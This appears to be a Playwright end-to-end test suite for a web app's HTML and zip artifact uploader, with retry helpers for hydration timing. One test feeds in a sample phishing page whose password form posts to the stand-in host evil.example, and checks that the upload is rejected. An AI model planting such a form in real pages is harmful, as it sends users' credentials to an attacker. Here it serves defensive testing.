import { test, expect, type Page } from "@playwright/test";
import { zipSync, strToU8 } from "fflate";

function uniqueEmail(): string {
  return `e2e_upl_${Math.random().toString(36).slice(2)}@example.com`;
}

/**
 * Attach a file through the uploader's file input, retrying until it takes.
 *
 * The hazard here is hydration, and it is indifferent to the mechanism.
 * Playwright waits for the element to be ATTACHED, not for React to have bound
 * its handler. In dev mode, first-hit route compilation makes that window wide
 * enough to lose the interaction entirely: no filename appears and the failure
 * reads as a broken upload.
 *
 * `setInputFiles` is NOT exempt — it sets the files and fires `change`, and if
 * `onChange` is not bound yet that event goes nowhere. Measured: with a warm
 * server it passed 4/4 three runs running, but under CI settings (fresh server,
 * cold compile) it failed all three attempts. Retrying is what actually works.
 *
 * This path also exercises the keyboard-accessible route that the
 * "Choose a file" control drives.
 */
async function attachFile(page: Page, name: string, bytes: Uint8Array) {
  const input = page.locator('input[type="file"]');
  await expect(async () => {
    await input.setInputFiles({
      name,
      mimeType: "application/zip",
      buffer: Buffer.from(bytes),
    });
    await expect(page.getByText(name)).toBeVisible({ timeout: 2_000 });
  }).toPass({ timeout: 30_000 });
}

/**
 * Drop a file on the dropzone, retrying until it takes.
 *
 * Keeps the real drag-and-drop path under test. The drop is retried rather
 * than gated on a readiness signal because there isn't a reliable one: probing
 * with a synthetic `dragover` and waiting for the dropzone's active border was
 * tried and never fired, so it only added a second way to fail. Re-dispatching
 * until the filename appears is indifferent to when hydration completes.
 *
 * Dropping twice is harmless — the handler just re-sets the same state.
 */
async function dropFile(page: Page, name: string, bytes: Uint8Array) {
  const dropzone = page.getByText(/drag & drop an \.html file or \.zip bundle/i);
  const dataTransfer = await page.evaluateHandle(
    ([fileBytes, fileName]) => {
      const dt = new DataTransfer();
      dt.items.add(
        new File([new Uint8Array(fileBytes as number[])], fileName as string, {
          type: "application/zip",
        }),
      );
      return dt;
    },
    [Array.from(bytes), name] as [number[], string],
  );

  await expect(async () => {
    await dropzone.dispatchEvent("drop", { dataTransfer });
    await expect(page.getByText(name)).toBeVisible({ timeout: 2_000 });
  }).toPass({ timeout: 30_000 });
}

async function signUp(page: Page) {
  await page.goto("/signup");
  await page.getByLabel("Full name").fill("E2E Uploader");
  await page.getByLabel("Email").fill(uniqueEmail());
  await page.getByLabel("Password", { exact: true }).fill("supersecret1");
  await page.getByLabel("Confirm password").fill("supersecret1");
  await page.getByRole("button", { name: /create account/i }).click();
  await expect(page).toHaveURL(/\/dashboard/);
}

test("a clean artifact uploads and appears in the list", async ({ page }) => {
  await signUp(page);
  await page.goto("/artifacts");
  await page.getByPlaceholder("Title").fill("E2E Deck");
  await page
    .getByPlaceholder(/doctype html/i)
    .fill("<!doctype html><html><body><h1>Hi</h1></body></html>");
  await page.getByRole("button", { name: /^upload$/i }).click();

  await expect(page.getByText("E2E Deck")).toBeVisible();
});

test("a zip bundle uploads, is inlined, and appears in the list", async ({ page }) => {
  await signUp(page);
  await page.goto("/artifacts");

  const zip = zipSync({
    "index.html": strToU8(
      '<!doctype html><html><head><link rel="stylesheet" href="assets/style.css"></head>' +
        "<body><h1>Bundle Deck</h1></body></html>",
    ),
    "assets/style.css": strToU8("h1{color:teal}"),
  });

  await attachFile(page, "bundle-deck.zip", zip);

  await expect(page.getByText("bundle-deck.zip")).toBeVisible();
  await page.getByRole("button", { name: /^upload$/i }).click();

  await expect(page.getByText("bundle-deck")).toBeVisible();
});

test("a malformed zip bundle is rejected with a reason", async ({ page }) => {
  await signUp(page);
  await page.goto("/artifacts");

  const zip = zipSync({
    "a.html": strToU8("<html></html>"),
    "b.html": strToU8("<html></html>"),
  });
  // Keeps the drag-and-drop path itself under test, hydration-gated.
  await dropFile(page, "two-pages.zip", zip);
  await page.getByRole("button", { name: /^upload$/i }).click();

  await expect(page.getByText(/exactly one root HTML file/i)).toBeVisible();
});

test("a malicious artifact is rejected with a reason", async ({ page }) => {
  await signUp(page);
  await page.goto("/artifacts");
  await page
    .getByPlaceholder(/doctype html/i)
    .fill(
      '<!doctype html><html><body><form action="https://evil.example/login"><input type="password"></form></body></html>',
    );
  await page.getByRole("button", { name: /^upload$/i }).click();

  await expect(page.getByText(/external origin/i)).toBeVisible();
});
